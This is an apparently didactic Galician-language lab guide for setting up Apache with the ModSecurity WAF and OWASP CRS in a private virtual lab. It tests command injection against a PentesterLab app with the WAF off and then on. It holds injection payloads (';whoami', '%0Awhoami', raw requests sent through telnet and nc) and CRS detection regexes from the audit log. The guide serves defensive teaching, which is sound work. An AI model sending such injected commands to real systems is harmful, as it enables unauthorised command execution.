<!DOCTYPE HTML>
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <title>WAF: ModSecurity</title>
    <link rel="stylesheet" type="text/css" href="css/styles.css" />
</head>

<body>
  <div id='autocentrado'>
    <h1 class='arriba'><a href='https://github.com/ricardofc/repoEDU-CCbySA/tree/main/SI/Pentester' target='_blank'><span class='BookmarkTitle-Level-1'>Servizo Web Apache + WAF ModSecurity</span></a></h1>
    <img class='cfigure mleft arriba' src="images/mouse-pointer-mini.png" />
    <figure class='cfigure'>
      <img class='contido bfigure pall' src="images/Escenario-WAF-PentesterLab.bmp" />
    </figure>

    <div class='nota w80 fright'>
      <p class='justify pall'><b>LIMITACIÓN DE RESPONSABILIDADE</b> O autor do presente documento declina calquera responsabilidade asociada ao uso incorrecto e/ou malicioso que puidese realizarse coa información exposta no mesmo. Por tanto, non se fai responsable en ningún caso, nin pode ser considerado legalmente responsable en ningún caso, das consecuencias que poidan derivarse da información contida nel ou que esté enlazada dende ou hacia el, incluíndo os posibles erros e información incorrecta existentes, información difamatoria, así como das consecuencias que se poidan derivar sobre a súa aplicación en sistemas de información reais e/ou virtuais. Este documento foi xerado para uso didáctico e debe ser empregado en contornas privadas e virtuais controladas co permiso correspondente do administrador desas contornas.</p>
      <p class='pall arriba'><b><span class='BookmarkTitle-Level-2'>NOTAS</span></b>:
        <ul type='square'>
          <li type='square'><a href='https://github.com/ricardofc/repoEDU-CCbySA/blob/main/SI/Criptografia/Practica-SI-Apache.pdf' target='_blank'>Servidor Web Apache</a>
                <img class='cfigure mleftsubs arribaplus' src="images/mouse-pointer-mini.png" />
                <p class='mtopplusx2'></p>
          </li>
          <li type='square'><span class='label'>Firewall de aplicacións web (WAF): ModSecurity</span>
            <p class='mtop'></p>
            <ul>
              <li><a href='https://github.com/SpiderLabs/ModSecurity/wiki/Reference-Manual-%28v2.x%29#Introduction' target='_blank'>v2.x &#10141; ModSecurity &#10141; Dependente de Apache</a>
                <img class='cfigure mleftsubs arribaplus' src="images/mouse-pointer-mini.png" />
                <p class='mtopplusx2'></p>
              <li><a href='https://github.com/SpiderLabs/ModSecurity' target='_blank'>v3.x &#10141; Libmodsecurity &#10141; Independente de Apache</a>.
                <img class='cfigure mleftsubs arribaplus' src="images/mouse-pointer-mini.png" />
                <p class='mtopplusx2'></p>
            </ul>
          </li>
          <li type='square'><a href='https://owasp.org/www-project-modsecurity-core-rule-set/' target='_blank'>OWASP: Regras básicas ModSecurity</a>
                <img class='cfigure mleftsubs arribaplus' src="images/mouse-pointer-mini.png" />
                <p class='mtopplusx2'></p>
          </li>
        </ul>
      </p>
    </div>

    <div class='pagebreak'>&nbsp;</div>

    <div class='contido'>
      <ol>
        <p class='mtop mleftsubs mbottom label'><span class='BookmarkTitle-Level-2'>Máquina virtual A: Kali amd64 (Apache + ModSecurity)</span></p>
          <li class='mtop mleft mbottom'>Na contorna gráfica abrir un terminal e executar: 
            <ul class='dashed-kali mleftsubs'>
              <li>setxkbmap es <span class='explicacion'> #Cambiar o mapa de teclado ao idioma español</span>.</li>
              <li>passwd kali <span class='explicacion'> #Cambiar o contrasinal do usuario kali. Por como contrasinal <b>abc123.</b> (Ollo que o contrasinal ten un caracter punto final)</span>.</li>
            </ul>
          </li>

        <li class='mtop mleft mbottom'>Cambiar hostname da máquina virtual A. Por kaliA como hostname: 
          <ul class='dashed-kali mleftsubs'>
            <li>sudo su - <span class='explicacion'> #Acceder á consola de root(administrador) a través dos permisos configurados co comando sudo (/etc/sudoers, visudo)</li>
              <ul class='hashtag-kali mleftsubs'>
                <li>echo 'kaliA' > /etc/hostname <span class='explicacion'> #Indicar ao sistema o valor do hostname.</span></li>
                <li>echo 'kernel.hostname=kaliA' >> /etc/sysctl.conf <span class='explicacion'> #Indicar ao kernel o valor do hostname.</span></li>
                <li>sysctl -p <span class='explicacion'> #Activar o cambio de hostname sen ter que pechar sesión nin reiniciar</span></li>
                <li>exit <span class='explicacion'> #Saír da consola local sudo na que estabamos a traballar para voltar á consola local de <b>kali</b>.</span></li>
              </ul>
              <li>exit <span class='explicacion'> #Pechar o terminal saíndo da consola local do usuario <b>kali</b>.</span></li>
            </ul>
          </ul>


        <li class='mtop mleft mbottom'>Configurar a rede: 
          <p class='mtop mleft mbottom'>Na contorna gráfica abrir un terminal e executar: 
            <ul class='dashed-kaliA mleftsubs'>
              <li>setxkbmap es <span class='explicacion'> #Cambiar o mapa de teclado ao idioma español</span>.</li>
              <li>sudo su - <span class='explicacion'> #Acceder á consola de root(administrador) a través dos permisos configurados co comando sudo (/etc/sudoers, visudo)</li>
                <ul class='hashtag-kaliA mleftsubs'>
                  <li>/etc/init.d/avahi-daemon stop <span class='explicacion'> #Parar o demo avahi-daemon(control resolución de nomes) para poder configurar de forma manual a configuración de rede e non ter conflicto con este demo.</span></li>
                  <li>/etc/init.d/network-manager stop || pkill NetworkManager<span class='explicacion'> #Parar o demo network-manager(xestor de rede) ou o script NetworkManager (executado sen ser demo) para poder configurar de forma manual a configuración de rede e non ter conflicto con este xestor.</span></li>
                  <li>ip addr show<span class='explicacion'> #Amosar a configuración de todas as tarxetas de rede. Nesta caso, na máquina A, as tarxetas de redes: loopback(lo) e interna(eth0)</span>.</li>
                  <li>ip addr add 192.168.120.100/24 dev eth0<span class='explicacion'> #Configurar a tarxeta de rede interna eth0, coa IP: 192.168.120.100 e máscara de subrede: 255.255.255.0</span>.</li>
                  <li>ip addr show<span class='explicacion'> #Amosar a configuración de todas as tarxetas de rede. Nesta caso, na máquina A, as tarxetas de redes: loopback(lo) e interna(eth0)</span>.</li>
                  <li>ping -c4 192.168.120.100 <span class='explicacion'> #Comprobar mediante o comando ping a conectividade coa interface de rede local eth0</span></li>
                </ul>
            </ul>

        <li class='mtop mleft mbottom'>Comprobar estado do Servidor SSH: 
          <ul class='dashed-kaliA mleftsubs'>
              <ul class='hashtag-kaliA mleftsubs'>
                <li>/etc/init.d/ssh status <span class='explicacion'> #Comprobar o estado do servidor SSH, por defecto non está arrancado.</span></li>
                <li>nc -vz localhost 22 <span class='explicacion'> #Mediante o comando nc(netcat) comprobar se o porto 22 do servidor ssh está en estado escoita(listen), esperando conexións. A opción -v corresponde á opción verbose, o que permite amosar información máis detallada na saída do comando. A opción -z permite devolver PROMPT do sistema e de igual xeito facer o escaneo ao/s porto/s solicitados. O número 22 é o porto TCP a escanear.</span></li>
                <li>nc -vz 192.168.120.100 22 <span class='explicacion'> #Mediante o comando nc(netcat) comprobar se o porto 22 do servidor ssh está en estado escoita(listen), esperando conexións. A opción -v corresponde á opción verbose, o que permite amosar información máis detallada na saída do comando. A opción -z permite devolver PROMPT do sistema e de igual xeito facer o escaneo ao/s porto/s solicitados. O número 22 é o porto TCP a escanear.</span></li>
                <li>netstat -natp | grep 22 <span class='explicacion'> #Mediante o comando netstat comprobar que o porto 22 do servidor SSH está en estado escoita(listen), esperando conexións. A opción -n permite non resolver nomes amosando así soamente as IPs e o comando ser máis rápido na execución. A opción -a equivale á opción all o que permite amosar todos os sockets (conectores) á escoita no servidor. A opción -t equivale a tcp o que permite buscar soamente información sobre o protocolo TCP. A opción -p equivale a program e amosa o PID e nome do programa ao cal pertence o socket.</span></li>
                <li>ss -natp | grep 22 <span class='explicacion'> #Mediante o comando ss comprobar que o porto 22 do servidor SSH está en estado escoita(listen), esperando conexións. A opción -n permite non resolver nomes amosando así soamente as IPs e o comando ser máis rápido na execución. A opción -a equivale á opción all o que permite amosar todos os sockets (conectores) á escoita no servidor. A opción -t equivale a tcp o que permite buscar soamente información sobre o protocolo TCP. A opción -p equivale a program e amosa o PID e nome do programa ao cal pertence o socket.</span></li>
                <li>/etc/init.d/ssh start <span class='explicacion'> #Arrancar o servidor SSH.</span></li>
                <li>/etc/init.d/ssh status <span class='explicacion'> #Comprobar o estado do servidor SSH, agora debe estar arrancado.</span></li>
                <li>find /etc/rc* -name "*ssh*"<span class='explicacion'> #Busca polas links runlevels nos cartafoles /etc/rc*</span></li>
                <li>systemctl enable ssh<span class='explicacion'> #Permite que o servizo ssh sexa iniciado no arranque xerando os links nos runlevels (/etc/rcX.d)</span></li>
                <li>find /etc/rc* -name "*ssh*"<span class='explicacion'> #Busca polas links runlevels nos cartafoles /etc/rc*</span></li>
                <li>systemctl is-enabled ssh.service<span class='explicacion'> #Amosa se o servizo ssh está enabled ou disabled</span></li>
    <div class='pagebreak'>&nbsp;</div>
                <li>nc -vz 192.168.120.100 22 <span class='explicacion'> #Mediante o comando nc(netcat) comprobar se o porto 22 do servidor ssh está en estado escoita(listen), esperando conexións. A opción -v corresponde á opción verbose, o que permite amosar información máis detallada na saída do comando. A opción -z permite devolver PROMPT do sistema e de igual xeito facer o escaneo ao/s porto/s solicitados. O número 22 é o porto TCP a escanear.</span></li>
                <li>ssh -v kali@localhost<span class='explicacion'> #Comprobar se o servidor SSH está activo e podemos conectarnos a el dende localhost co usuario kali e o seu contrasinal. Se é a primeira ver que nos conectamos o servidor avísanos se estamos de acordo coa autenticación. Respostamos yes e pulsamos Enter. A opción -v (modo verbose) aporta información máis detallada da conexión.
                </li>
                <ul class='dashed-kaliA mleftsubs'>
                  <li>exit <span class='explicacion'> #Saír da consola remota ssh a que acabamos de acceder, para voltar á consola local de <b>root</b>.</span></li>
                </ul>
                <li>exit <span class='explicacion'> #Saír da consola local sudo na que estabamos a traballar para voltar á consola local de <b>kali</b>.</span></li>
              </ul>
              <li>
          </ul>
        </li>

          </ul>

        <div class='pagebreak'>&nbsp;</div>

        <p class='mtop mleftsubs mbottom label'><span class='BookmarkTitle-Level-2'>Máquina virtual C: PentesterLab i386</span></p>
          <li class='mtop mleft mbottom'>Iniciar ➝ Executar no terminal: 
            <ul class='dashed mleftsubs'>
              <li>ip addr show<span class='explicacion'> #Amosar a configuración de todas as tarxetas de rede. Nesta caso, as tarxetas de rede: loopback(lo) e interna(eth0)</span>.</li>
              <li>sudo su - <span class='explicacion'> #Acceder á consola de root(administrador) a través dos permisos configurados co comando sudo (/etc/sudoers, visudo)</li>
              <ul class='hashtag mleftubs'>
                <li>dpkg-reconfigure console-data <span class='explicacion'> #Cambiar o mapa de teclado ao idioma español. Nota: Escoller as opcións standar para o teclado qwerty.</span></li>
                <li>ip addr add 192.168.120.120/24 dev eth0<span class='explicacion'> #Configurar a tarxeta de rede interna eth0, coa IP: 192.168.120.120 e máscara de subrede: 255.255.255.0</span>.</li>
                <li>init 0 <span class='explicacion'> #Apagar a máquina enviando o sinal de apagado mediante o runlevel 0</span></li>
              </ul>
            </ul>
          </li>


        <div class='pagebreak'>&nbsp;</div>
        <p class='mtop mleftsubs mbottom label'><span class='BookmarkTitle-Level-2'>Máquina virtual B: Kali amd64</span></p>
   
        <li class='mtop mleft mbottom'>Configuración da rede. Na contorna gráfica abrir un terminal e executar: 
          <ul class='dashed-kali mleftsubs'>
            <li>setxkbmap es <span class='explicacion'> #Cambiar o mapa de teclado ao idioma español</span>.</li>
            <li>sudo su - <span class='explicacion'> #Acceder á consola de root(administrador) a través dos permisos configurados co comando sudo (/etc/sudoers, visudo)</li>
              <ul class='hashtag-kali mleftsubs'>
                <li>/etc/init.d/avahi-daemon stop <span class='explicacion'> #Parar o demo avahi-daemon(control resolución de nomes) para poder configurar de forma manual a configuración de rede e non ter conflicto con este demo.</span></li>
                  <li>/etc/init.d/network-manager stop || pkill NetworkManager<span class='explicacion'> #Parar o demo network-manager(xestor de rede) ou o script NetworkManager (executado sen ser demo) para poder configurar de forma manual a configuración de rede e non ter conflicto con este xestor.</span></li>
                <li>ip addr show<span class='explicacion'> #Amosar a configuración de todas as tarxetas de rede. Nesta caso, na máquina B as tarxetas de redes: loopback(lo) e interna(eth0)</span>.</li>
                <li>ip addr add 192.168.120.101/24 dev eth0<span class='explicacion'> #Configurar a tarxeta de rede interna eth0, coa IP: 192.168.120.101 e máscara de subrede: 255.255.255.0</span>.</li>
                <li>ip addr show<span class='explicacion'> #Amosar a configuración de todas as tarxetas de rede. Nesta caso, na máquina B as tarxetas de redes: loopback(lo) e interna(eth0)</span>.</li>
                <li>ping -c4 192.168.120.101 <span class='explicacion'> #Comprobar mediante o comando ping a conectividade coa interface de rede local eth0</span></li>
                <li>ping -c4 192.168.120.100 <span class='explicacion'> #Comprobar mediante o comando ping a conectividade coa interface de rede da máquina virtual A</span></li>
                <li>echo '192.168.120.100 kaliA' >> /etc/hosts <span class='explicacion'> #Engadir no ficheiro /etc/hosts, é dicir, na táboa estática de búsqueda para nomes de host (DNS) o nome kaliA, para que atenda á IP 192.168.120.100</li> 
                <li>ping -c4 kaliA <span class='explicacion'> #Comprobar mediante o comando ping a conectividade coa interface de rede da máquina virtual A</span></li>
             </ul>
          </ul>
        </li>

        <li class='mtop mleft mbottom'>Cambiar hostname da máquina virtual B. Por kaliB como hostname: 
          <ul class='dashed-kali mleftsubs'>
              <ul class='hashtag-kali mleftsubs'>
                <li>echo 'kaliB' > /etc/hostname <span class='explicacion'> #Indicar ao sistema o valor do hostname.</span></li>
                <li>echo 'kernel.hostname=kaliB' >> /etc/sysctl.conf <span class='explicacion'> #Indicar ao kernel o valor do hostname.</span></li>
                <li>sysctl -p <span class='explicacion'> #Activar o cambio de hostname sen ter que pechar sesión nin reiniciar</span></li>
                <li>exit <span class='explicacion'> #Saír da consola local sudo na que estabamos a traballar para voltar á consola local de <b>kali</b>.</span></li>
              </ul>
              <li>exit <span class='explicacion'> #Pechar o terminal saíndo da consola local do usuario <b>kali</b>.</span></li>
            </ul>
          </ul>
        </li>

        <p class='mtop pall mleftplus arriba'><span class='labelmini'> <sub>SSH</sub> </span></p>
        <li class='mtop mleft mbottom'><span class='label'>B &#10140; A </span>Acceder mediante SSH dende a máquina virtual B á máquina virtual A. Dende agora executaremos sempre os comandos dende a máquina virtual B, a través da consola SSH: 
          <p class='mtop mleft mbottom'>Na contorna gráfica abrir un terminal e executar:</p> 
            <ul class='dashed-kaliB mleftsubs'>
              <li>setxkbmap es <span class='explicacion'> #Cambiar o mapa de teclado ao idioma español</span>.</li>
              <li>nc -vz 192.168.120.100 22 <span class='explicacion'> #Mediante o comando nc(netcat) comprobar que o porto 22 do servidor SSH está en estado escoita(listen), esperando conexións. A opción -v corresponde á opción verbose, o que permite amosar información máis detallada na saída do comando. A opción -z permite devolver PROMPT do sistema e de igual xeito facer o escaneo ao/s porto/s solicitados. O número 22 é o porto TCP a escanear.</span></li>
              <li>nc -vz  kaliA 22 <span class='explicacion'> #Mediante o comando nc(netcat) comprobar que o porto 22 do servidor SSH está en estado escoita(listen), esperando conexións. A opción -v corresponde á opción verbose, o que permite amosar información máis detallada na saída do comando. A opción -z permite devolver PROMPT do sistema e de igual xeito facer o escaneo ao/s porto/s solicitados. O número 22 é o porto TCP a escanear.</span></li>
              <li>ssh -v kali@192.168.120.100<span class='explicacion'> #Comprobar se o servidor SSH está activo e podemos conectarnos a el. Agora accedemos como o usuario <b>kali</b> a través da conexión cifrada SSH.</span></li>
              <ul class='dashed-kaliA'>
                <li></li>
              </ul>
            </ul>
        </li>

        <li class='mtop mleft mbottom'><span class='label'><span class='BookmarkTitle-Level-3'>Activar Servidor Web Apache:</span></span>
          <ul>
            <ul class='dashed-kaliA'>
              <li>sudo su - <span class='explicacion'> #Acceder á consola de root(administrador) a través dos permisos configurados co comando sudo (/etc/sudoers, visudo)</li>
                <ul class='hashtag-kaliA'>
                  <li>/etc/init.d/apache2 status <span class='explicacion'> #Comprobar o estado do servidor web Apache.</span></li>
                  <li>/etc/init.d/apache2 start <span class='explicacion'> #Iniciar o servidor web Apache.</span></li>
                  <li>/etc/init.d/apache2 status <span class='explicacion'> #Comprobar o estado do servidor web Apache.</span></li>
                  <li>nc -vz 192.168.120.100 80 <span class='explicacion'> #Mediante o comando nc(netcat) comprobar se o porto 80 do servidor web Apache está en estado escoita(listen), esperando conexións. A opción -v corresponde á opción verbose, o que permite amosar información máis detallada na saída do comando. A opción -z permite devolver PROMPT do sistema e de igual xeito facer o escaneo ao/s porto/s solicitados. O número 80 é o porto TCP a escanear.</span></li>

                    <div class='pagebreak'>&nbsp;</div>

                    <div class='explicacion3'> No caso da distribución Kali xa temos instalado o servidor web Apache, pero nunha distribución baseada en Debian poderiamos instalalo do seguinte xeito:<br />
                      <ul class='hashtag'>
                        <li>apt update <span class='explicacion'> #Actualizar o listado de paquetes dos repositorios (/etc/apt/sources.list, /etc/apt/sources.list.d/)</li>
                        <li>apt search apache2 <span class='explicacion'> #Buscar calquera paquete que coincida co patrón de búsqueda apache2</li>
                        <li>apt -y install apache2 <span class='explicacion'> #Instalar o paquete apache2, é dicir, instalar o servidor HTTP apache2. Co parámetro -y automaticamente asumimos yes a calquera pregunta que ocorra na instalación do paquete.</li>
                      </ul>
                    </div>
                </ul>
              </ul>
            </ul>
          </ul>
        </li>

        <li class='mtop mleft mbottom'>Lanzar na máquina virtual B (Kali) un navegador e visitar a IP 192.168.120.100 ou a URL http://192.168.120.100</li>

        <li class='mtop mleft mbottom'>Copiar cartafol que contén a aplicación de probas da Máquina C PentesterLab, para que poida ser visible a través do servidor Apache da Máquina virtual A: 
          <ul>
            <ul>
              <ul class='hashtag-kaliA'>
                <li>scp -oHostKeyAlgorithms=+ssh-rsa -r user@192.168.120.100:/var/www /tmp <span class='explicacion'> #Copiar o cartafol /var/www (DocumentRoot do servidor web da Máquina C PentesterLab) ao cartafol local /tmp da Máquina A Kali amd64</span>.</li>
                <li>mv /tmp/www/* /var/www/html/ <span class='explicacion'>#Mover o cartafol que contén a aplicación de PentesterLab ao DocumentRoot da máquina virtual A</span></li>
                <li>ln -s /var/www/html/upload /var/www/upload <span class='explicacion'>#Crear esta ligazón simbólica para evitar error na execución de probas coa aplicación PentesterLab</span></li>
                <li>ln -s /var/www/html/files /var/www/files <span class='explicacion'>#Crear esta ligazón simbólica para evitar error na execución de probas coa aplicación PentesterLab</span></li>
                <li>/etc/init.d/apache2 restart <span class='explicacion'> #Reiniciar o servidor web Apache.</span></li>
                <li>/etc/init.d/apache2 status <span class='explicacion'> #Comprobar o estado do servidor web Apache.</span></li>
              </ul>
            </ul>
          </ul>
        </li>

        <li class='mtop mleft mbottom'>Lanzar na máquina virtual B (Kali) un navegador e visitar a IP 192.168.120.100 e a URL http://192.168.120.100/index.php</li>

        <li class='mtop mleft mbottom'>Permisos apache: 
          <ul>
            <ul>
              <ul class='hashtag-kaliA'>
                <li>chown -R www-data. /var/www/html/ <span class='explicacion'>#Cambiar usuario propietario www-data e grupo propietario www-data a toda a árbore de ficheiros e directorios que colgan do directorio DocumentRoot de Apache: /var/www/html</span></li>
                <li>chmod 444 /var/www/html/index.html <span class='explicacion'>#Cambiar a só lectura os permisos <b>ugo</b> do ficheiro index.html situado en /var/www/html, é dicir, establecer os permisos r--r--r-- (soamente lectura para o usuario propietario, o grupo propietario e o resto do mundo)</span></li>
                <li>/etc/init.d/apache2 restart <span class='explicacion'> #Reiniciar o servidor web Apache.</span></li>
                <li>/etc/init.d/apache2 status <span class='explicacion'> #Comprobar o estado do servidor web Apache.</span></li>
              </ul>
            </ul>
          </ul>
        </li>


        <li class='mtop mleft mbottom'>Actualizar na máquina virtual B (Kali) a páxina referente á URL http://192.168.120.100/index.php</li>

  <div class='pagebreak'>&nbsp;</div>
        <li class='mtop mleft mbottom'><a href='https://github.com/SpiderLabs/ModSecurity/wiki/Reference-Manual-%28v2.x%29#Installation_for_Apache'><span class='BookmarkTitle-Level-3'>Activación ModSecurity</span></a>
          <img class='cfigure mleftsubs arribaplus' src="images/mouse-pointer-mini.png" />
          <p class='mtopplus'></p>
          <ul>
            <ul>
              <ul class='hashtag-kaliA'>
                <li>apt update <span class='explicacion'> #Actualizar o listado de paquetes dos repositorios (/etc/apt/sources.list, /etc/apt/sources.list.d/)</li>
                <li>apt search modsecurity <span class='explicacion'> #Buscar calquera paquete que coincida co patrón de búsqueda modsecurity</li>
                <li>apt -y install libapache2-mod-security2 <span class='explicacion'> #Instalar o paquete libapache2-mod-security2, é dicir, instalar o WAF modsecurity intregrado como módulo para o servidor web apache2. Co parámetro -y automaticamente asumimos yes a calquera pregunta que ocorra na instalación do paquete.</li>
                <li>dpkg -L libapache2-mod-security2 <span class='explicacion'>#Listar ficheiros pertencentes ao paquete libapache2-mod-security2</span>
                <blockquote>
                  <pre>
/.
/etc
/etc/apache2
/etc/apache2/mods-available
/etc/apache2/mods-available/security2.conf
/etc/apache2/mods-available/security2.load
/etc/modsecurity
/etc/modsecurity/modsecurity.conf-recommended
/etc/modsecurity/unicode.mapping
/usr
/usr/bin
/usr/bin/mlogc
/usr/lib
/usr/lib/apache2
/usr/lib/apache2/modules
/usr/lib/apache2/modules/mod_security2.so
/usr/share
/usr/share/doc
/usr/share/doc/libapache2-mod-security2
/usr/share/doc/libapache2-mod-security2/README.Debian
/usr/share/doc/libapache2-mod-security2/README.md
/usr/share/doc/libapache2-mod-security2/README.mlogc
/usr/share/doc/libapache2-mod-security2/changelog.Debian.gz
/usr/share/doc/libapache2-mod-security2/changelog.gz
/usr/share/doc/libapache2-mod-security2/copyright
/usr/share/doc/libapache2-mod-security2/mlogc-default.conf
/var
/var/cache
/var/cache/modsecurity
                  </pre>
                </blockquote>
                <li>cat /etc/apache2/mods-available/security2.conf <span class='explicacion'>#Ver o contido do ficheiro security2.conf, o cal cargarase ao activar o módulo security2 (modsecurity)</span>
                <blockquote>
                  <pre class='mtopsubs'>
<IfModule security2_module>
        # Default Debian dir for modsecurity's persistent data
        SecDataDir /var/cache/modsecurity

        # Include all the *.conf files in /etc/modsecurity.
        # Keeping your local configuration in that directory
        # will allow for an easy upgrade of THIS file and
        # make your life easier
        IncludeOptional /etc/modsecurity/*.conf

        # Include OWASP ModSecurity CRS rules if installed
        IncludeOptional /usr/share/modsecurity-crs/*.load
</IfModule>
                  </pre>
                </blockquote>
                <li class='mtopsubsx2'>mv /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf <span class='explicacion'>#Renomear o ficheiro necesario para cargar a configuración do módulo security2 (modsecurity).</span></li>
  <div class='pagebreak'>&nbsp;</div>
                <li>sed -i 's/SecRuleEngine DetectionOnly/SecRuleEngine On/' /etc/modsecurity/modsecurity.conf <span class='explicacion'>#Modificar a directiva <span class='label'>SecRuleEngine</span>. Por defecto configúrase modsecurity en modo detección <a href='https://github.com/SpiderLabs/ModSecurity/wiki/Reference-Manual-%28v2.x%29#SecRuleEngine' target='_blank'>(DetectionOnly)</a>, polo cal soamente detecta ataques pero non actúa sobre o detectado.</span>
                  <img class='cfigure mleftplus240' src="images/mouse-pointer-mini.png" />
                </li>
                <li>sed -i 's/SecAuditLogParts ABDEFHIJZ/SecAuditLogParts ABEFHIJKZ/' /etc/modsecurity/modsecurity.conf <span class='explicacion'>#Modificar a directiva <a href='https://github.com/SpiderLabs/ModSecurity/wiki/Reference-Manual-%28v2.x%29#SecAuditLogParts' target='_blank'>SecAuditLogParts</a>. 
                  <img class='cfigure mleftplus280x2' src="images/mouse-pointer-mini.png" />
                  <p class='mtopplusx2'></p>
                  <p class='up'>Por defecto configúrase modsecurity coa opción D que non está implementada e sen a opción K, a cal permite ver nos logs unha lista completa de todas as regras que coincidían (unha por liña) na orde en que foron coincidentes. As regras están totalmente cualificadas e, polo tanto, mostrarán accións herdadas e operadores predeterminados. Compatible a partir da versión 2.5.0.</p></span>
                </li>

                <li>a2enmod security2 <span class='explicacion'>#Habilitar o módulo security2 que permite activar a configuración do WAF ModSecurity</span></li>
                <li>/etc/init.d/apache2 restart <span class='explicacion'> #Reiniciar o servidor web Apache.</span></li>
                <li>tail -f /var/log/apache2/modsec_audit.log <span class='explicacion'> #Deixar aberto o ficheiro /var/log/apache2/modsec_audit.log para lectura, comenzando a ver polas 10 últimas liñas.</span></li>
              </ul>
            </ul>
          </ul>


        <div class='pagebreak'>&nbsp;</div>

        <p class='mtop mbottom label'><b>
        <a href='https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/SI/Pentester/Practica-SI-PentesterLab_pageNumbers.pdf' target='_blank'><span class='BookmarkTitle-Level-2'>Probas ataques &#10141; Práctica SI PentesterLab</span>
        </a>
        </b>
          <img class='cfigure mleftsubs arribaplus' src="images/mouse-pointer-mini.png" />
          <p class='mtopplusx2'></p>
        </p>
	<ol type='I'>
          <li class='mleftsubs mtopsubs'><p><i><b><span class='BookmarkTitle-Level-3'>Command injection</span></b></i></li>
          <b><i><span class='label'><span class='BookmarkTitle-Level-4'>ModSecurity DESACTIVADO</span></span></b></i>
          <div class='explicacion3'> 
            <ul class='hashtag'>
              <li>a2dismod security2 <span class='explicacion'>#Deshabilitar o módulo security2 que permite desactivar a configuración do WAF ModSecurity</span></li>
              <li>/etc/init.d/apache2 restart <span class='explicacion'> #Reiniciar o servidor web Apache.</span></li>
            </ul>
          </div>

          <ol type="a" class='mleftsubs'>
            <li><p><i><span class='BookmarkTitle-Level-5'>Example 1</span></i> ➝ <br />
             <code>http://192.168.120.100/commandexec/example1.php?ip=127.0.0.1</code><br />
             <span class='red'><b><code>http://192.168.120.100/commandexec/example1.php?ip=127.0.0.1;whoami</code></b></p>
            </li>
            <li><p><i><span class='BookmarkTitle-Level-5'>Example 2</span></i> ➝ <br />
             <code>http://192.168.120.100/commandexec/example2.php?ip=127.0.0.1</code><br />
             <span class='red'><b><code>http://192.168.120.100/commandexec/example2.php?ip=127.0.0.1%0Awhoami</code></b></p>
            </li>
            <li><p><i><span class='BookmarkTitle-Level-5'>Example 3</span></i> ➝ 
              <p class='mleftsubsx2'><span class='red'><b><code>echo -en &quot;GET /commandexec/example3.php?ip=127.0.0.1;whoami HTTP/1.0 \r\n\r\n&quot; | \ telnet 192.168.120.100 80</code></b></p>
              <p class='mleftsubsx2'><span class='red'><b><code>echo -en &quot;GET /commandexec/example3.php?ip=127.0.0.1;whoami HTTP/1.0 \r\n\r\n&quot; | \ <br />nc 192.168.120.100 80</code></b></p>
            </li>
          </ol>
          <b><i><span class='label'><span class='BookmarkTitle-Level-4'>ModSecurity ACTIVADO</span></span></b></i>
            <div class='explicacion3'> 
            <ul class='hashtag'>
              <li>a2enmod security2 <span class='explicacion'>#Habilitar o módulo security2 que permite activar a configuración do WAF ModSecurity</span></li>
              <li>/etc/init.d/apache2 restart <span class='explicacion'> #Reiniciar o servidor web Apache.</span></li>
              <li>tail -f /var/log/apache2/modsec_audit.log <span class='explicacion'> #Deixar aberto o ficheiro /var/log/apache2/modsec_audit.log para lectura, comenzando a ver polas 10 últimas liñas.</span></li>
            </ul>
          </div>


          <ol type="a" class='mleftsubs'>
            <li><p><i><span class='BookmarkTitle-Level-5'>Example 1</span></i> ➝ <br />
             <code>http://192.168.120.100/commandexec/example1.php?ip=192.168.120.101</code><br />
             <span class='red'><b><code>http://192.168.120.100/commandexec/example1.php?ip=192.168.120.101;whoami</code> ➝ O ataque non ten éxito ➝ ModSecurity ➝ OWASP_CRS ➝ Erro 403 </p></p>
             <div class='explicacion3' style='margin-left:-40px;'>
               <ul>
                 Agora non se amosa a execución do comando whoami. Isto é debido a que agora está activado o módulo security2 (modsecurity). De feito, revisando os logs (/var/log/apache2/modsec_audit.log) atopamos que una regra de OWASP (OWASP_CRS/3.3.2) detecta o intento de execución de comandos na sección H:</b></p>
                 <pre style='white-space: pre-wrap;'>
--d5eb2d28-H--
Message: Warning. Pattern match "(?:;|\\{|\\||\\|\\||&|&&|\\n|\\r|\\$\\(|\\$\\(\\(|`|\\${|<\\(|>\\(|\\(\\s*\\))\\s*(?:{|\\s*\\(\\s*|\\w+=(?:[^\\s]*|\\$.*|\\$.*|<.*|>.*|\\'.*\\'|\".*\")\\s+|!\\s*|\\$)*\\s*(?:'|\")*(?:[\\?\\*\\[\\]\\(\\)\\-\\|+\\w'\"\\./\\\\]+/)?[\\\\'\"]*(?:s[\\\\'\"]* ..." at ARGS:ip. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "158"] [id "932105"] [msg "Remote Command Execution: Unix Command Injection"] [data "Matched Data: ;whoami found within ARGS:ip: 192.168.120.101;whoami"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"]
Message: Warning. Pattern match "(?i)(?:;|\\{|\\||\\|\\||&|&&|\\n|\\r|`)\\s*[\\(,@\\'\"\\s]*(?:[\\w'\"\\./]+/|[\\\\'\"\\^]*\\w[\\\\'\"\\^]*:.*\\\\|[\\^\\.\\w '\"/\\\\]*\\\\)?[\"\\^]*(?:s[\"\\^]*(?:y[\"\\^]*s[\"\\^]*(?:t[\"\\^]*e[\"\\^]*m[\"\\^]*(?:p[\"\\^]*r[\"\\^]*o[\"\\^]*p[\"\\^]*e ..." at ARGS:ip. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "294"] [id "932115"] [msg "Remote Command Execution: Windows Command Injection"] [data "Matched Data: ;whoami found within ARGS:ip: 192.168.120.101;whoami"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-shell"] [tag "platform-windows"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"]
